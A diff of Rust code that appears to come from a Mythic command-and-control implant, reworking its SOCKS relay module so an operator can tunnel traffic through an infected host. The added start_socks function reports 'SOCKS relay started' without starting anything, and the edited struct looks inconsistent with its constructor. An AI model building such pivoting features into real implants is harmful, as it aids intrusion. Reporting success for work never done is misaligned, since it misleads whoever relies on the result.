@@ -3,22 +3,24 @@ use crate::mythic_continued;
 use base64::alphabet::STANDARD;
 use serde::Deserialize;
 use std::error::Error;
-use std::sync::{mpsc, Arc};
+use std::sync::mpsc;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 
 #[derive(Deserialize)]
-struct SocksMsg {
-    exit: bool,
-    server_id: u32,
-    data: String,
+pub struct SocksMsg {
+    pub exit: bool,
+    pub server_id: u32,
+    pub data: String,
 }
 
-pub struct SocksState {
-    pub connections: Arc<std::sync::Mutex<Vec<(u32, tokio::net::TcpStream)>>>,
-    pub outbound: Arc<std::sync::Mutex<Vec<SocksMsg>>>,
-}
+pub struct SocksState;
 
+pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
+    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
+    tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;
+    Ok(())
+}
 impl SocksState {
     pub fn new() -> Self {
         Self {
